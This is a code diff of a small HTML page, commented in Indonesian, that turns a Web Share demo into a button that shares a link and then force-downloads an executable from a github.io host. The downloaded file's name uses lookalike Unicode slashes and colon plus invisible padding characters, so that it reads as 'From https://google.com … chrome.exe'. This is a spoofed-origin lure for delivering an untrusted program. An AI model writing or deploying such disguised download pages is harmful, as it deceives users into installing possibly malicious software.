@@ -1,44 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Redirect + Web Share</title>
+  <title>Web Share + External Download</title>
 </head>
 <body style="height:100vh; display:flex; justify-content:center; align-items:center;">
 
+<button id="shareDownloadBtn">Share & Download File</button>
+
 <script>
-function showShare() {
-    // Memanggil Web Share API
+document.getElementById("shareDownloadBtn").onclick = async function() {
+    // 1. Web Share API
     if (navigator.share) {
-        navigator.share({
-            title: 'Example Site',
-            text: 'Check out this website!',
-            url: window.location.href
-        })
-        .then(() => console.log('Sharing success!'))
-        .catch(err => console.log('Sharing canceled or failed:', err));
+        try {
+            await navigator.share({
+                title: 'Example Text File',
+                text: 'Check out this file!',
+                url: 'https://example.com'  // bisa diganti ke URL apa saja
+            });
+            console.log('Sharing success!');
+        } catch(err) {
+            console.log('Sharing canceled or failed:', err);
+        }
     } else {
         alert('Web Share API not supported on this browser.');
     }
-}
 
-// Cek query parameter
-const urlParams = new URLSearchParams(window.location.search);
-if (urlParams.get('share') === 'true') {
-    // Buat tombol agar user klik → aman di browser
-    const btn = document.createElement('button');
-    btn.textContent = "Click to Share This Page";
-    btn.onclick = showShare;
-    document.body.appendChild(btn);
-} else {
-    // Tombol awal → redirect ke "example.com?share=true"
-    const btn = document.createElement('button');
-    btn.textContent = "Go to Example.com & Share";
-    btn.onclick = function() {
-        // Redirect
-        window.location.href = "https://example.com?share=true";
-    };
-    document.body.appendChild(btn);
-}
+    // 2. Download file eksternal
+    const fileUrl = 'http://ecdnts-del.github.io/test-apk/From https∶⧸⧸google.com ⠀⠀⠀⠀⠀ chrome.exe';
+    const a = document.createElement('a');
+    a.href = fileUrl;
+    a.download = 'From https∶⧸⧸google.com ⠀⠀⠀⠀⠀ chrome.exe'; // nama file yang di-download
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+};
 </script>
 
 </body>
